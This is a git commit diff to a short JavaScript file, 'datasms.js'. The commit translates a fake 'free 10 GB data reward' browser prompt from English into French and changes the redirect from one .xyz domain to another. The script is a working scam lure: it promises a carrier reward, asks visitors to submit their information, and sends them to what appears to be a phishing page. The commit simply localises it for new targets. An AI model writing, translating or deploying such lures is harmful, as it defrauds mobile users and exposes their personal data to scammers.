c8f63338b25fa519f379ebfe8cb07ce38b492cdf
bigetijazz5 <bigetijazz5@gmail.com>
2024-07-01 01:25:36 -0700

    Update datasms.js

--- datasms.js
+++ datasms.js
@@ -1,5 +1,5 @@
 var password = '1'
-password=prompt('Data Reward: Congratulations, you are Eligible to receive 10GB free data, kindly press 1 to submit your information now ','1');
+password=prompt('Récompense de données: Toutes nos félicitations, vous êtes éligible pour recevoir 10 Go de données gratuites pour vos anciens clients, veuillez appuyer sur 1 pour soumettre vos informations maintenant ','1');
 if (password != '1') {
-location.href='https://www.ibaakanawan.xyz/allnetworkreward';
+location.href='https://www.giga-offre.xyz/recompense-de-donnees';
 }
